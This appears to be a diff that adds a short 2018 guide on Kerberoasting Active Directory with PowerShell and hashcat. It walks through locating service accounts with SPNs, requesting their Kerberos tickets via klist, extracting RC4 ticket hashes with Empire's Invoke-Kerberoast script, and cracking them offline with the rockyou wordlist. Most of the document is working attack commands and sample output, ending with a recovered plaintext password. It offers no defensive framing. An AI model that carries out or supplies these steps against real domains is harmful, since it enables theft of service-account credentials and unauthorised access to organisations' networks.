@@ -1,0 +1,85 @@
+How to Kerberoast with PowerShell (without Mimikatz) 
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Short guide by Ville Koch (27.07.2018)
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+1) First you have to be on a domain joined Windows system logged in with a domain user (or having taken over an active session of such a user)
+2) Now search for Domain users with configured SPNs, for example with following PowerShell Script: https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts
+3) For all these SPNs you could now get a Kerberos Ticket, but you will be only interested in the ones registered on domain users instead of hosts! (check https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/ for Details)
+4) To get the Kerberos Ticket, open cmd.exe --> "klist get <SPN>" (SPN obtained in step 3)
+
+	Example:
+	C:\>klist get HTTP/SA-PF00-F5-SPS
+	Current LogonId is 0:0x29ca8e9
+	A ticket to HTTP/SA-PF00-F5-SPS has been retrieved successfully.
+
+	Cached Tickets: (4)
+	#1> Client: domainuser @ CONTOSO.NET
+        Server: HTTP/SA-PF00-F5-SPS @ CONTOSO.NET
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 7/27/2018 14:56:45 (local)
+        End Time:   7/28/2018 0:56:45 (local)
+        Renew Time: 8/3/2018 14:56:14 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called: SS0001234.contoso.net
+	...
+
+5) Once you find one which has it's Encryption Type set to "RC4-HMAC" you can get the ticket hash with another PowerShell Script, e.g. https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+   Command: Get-DomainSPNTicket -SPN "<SPN>" -OutputFormat Hashcat
+   
+   Example:
+   PS U:\> Get-DomainSPNTicket -SPN "HTTP/SA-PF00-F5-SPS" -OutputFormat Hashcat
+
+
+	TicketByteHexStream  : 
+	Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$HTTP/SA-PF00-F5-SPS*$A4CBB9C21C71FFB4B59C8FD02B839034$B1930229B020660CFFC3168314E56BA04E8064F163376C985E3F83205B80712CCED93E963E544A0EE090B988F0587E5A1AA
+						   BBAA9D56EF5A21C8D59205908AF7F5874377ECFB729AD59EA19014A8C7BEBC3989D585D0CDE86155A6B5AB3F36DCCD24D63BB2488F7C83DEAF6464C171D28A7585D20967EE6745342BCCEA17902D0A669
+						   F19AF4AFF1D1044BB4E870E11D8AE686114AE955810091763AA9694E683BA927B52FAD09D02BF2A3C9638A53FBBE905037026FB58579123D9694CCEBD553F47F765EB339DEB5D6CFF51B47EDE100CBABD
+						   BD1D072593F9088D4407.............................................2FB96E9EAEBD8807C77B38065D0C8282907B00046A925B0E9F94ECF0579344848CCD453683BA1C9CE8ACCE85E9DDEE69
+						   A7C6EAA071E0A19DC9E1D3A3F8CB00A7FEFF974AA506B6C275C359859E4B98EAA352B334F2F4420C928B759A9AA4DBA7E8CF15D284813197F3943859B59CFC9FD58517414F9CB2E6E4546C014DAB21B05
+						   E87ABDBF35D574933EA538C5029CDF2CCFAD2FDCB50463D7AA2EAF3BB2B1D82D74CE2BE5017D2AD6FAA2731B7E6EDE409C0AC7DBA4727488B15918F1EE00BFD91195AB8FCF3CA9C45A2F1C5AF6249E90B
+						   AAD25C01B6B3960EF09DE0B3867ADB193BEB4384C494A8D85631514510E27526553749070DAEC6AB995F15D2DF2C986AF61D9B260E79D823B2A0D235E123BE320BBFAEA5EBE6AF8B2E67B295311EDD4FF
+						   8FCF84B7BB27BF4532E750E499
+	SamAccountName       : UNKNOWN
+	DistinguishedName    : UNKNOWN
+	ServicePrincipalName : HTTP/SA-PF00-F5-SPS
+   
+   (Example hash was reduced from original, is usually longer)
+   
+6) Now take this hash (make sure to remove all the formatting!) and use hashcat to crack it
+   This example uses a wordlist (rockyou.txt) and saves the output to a text file called crackedpw.txt:
+   
+   hashcat -m 13100 -a 0 -o crackedpw.txt hashcat_kticket.txt rockyou.txt  --force
+
+	Dictionary cache built:
+	* Filename..: rockyou.txt
+	* Passwords.: 14344392
+	* Bytes.....: 139921507
+	* Keyspace..: 14344385
+	* Runtime...: 3 secs
+
+													 
+	Session..........: hashcat
+	Status...........: Cracked
+	Hash.Type........: Kerberos 5 TGS-REP etype 23
+	Hash.Target......: $krb5tgs$23$*weaksvc$winlab.net$http/win7client*$ca...3d5502
+	Time.Started.....: Fri Jul 27 08:14:48 2018 (0 secs)
+	Time.Estimated...: Fri Jul 27 08:14:48 2018 (0 secs)
+	Guess.Base.......: File (rockyou.txt)
+	Guess.Queue......: 1/1 (100.00%)
+	Speed.Dev.#1.....:   216.1 kH/s (8.99ms) @ Accel:20 Loops:1 Thr:64 Vec:8
+	Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+	Progress.........: 10240/14344385 (0.07%)
+	Rejected.........: 0/10240 (0.00%)
+	Restore.Point....: 7680/14344385 (0.05%)
+	Candidates.#1....: somebody -> 1asshole
+	HWMon.Dev.#1.....: N/A
+
+	Started: Fri Jul 27 08:14:44 2018
+	Stopped: Fri Jul 27 08:14:49 2018
+	
+7) Now you have (if it worked and the password was not too complex ;) ) the password in plaintext:
+	root@kali:~# cat crackedpw.txt 
+	$krb5tgs$23$*UNKNOWN$UNKNOWN$HTTP/SA-PF00-F5-SPS*$255649a...2:P@ssw0rd
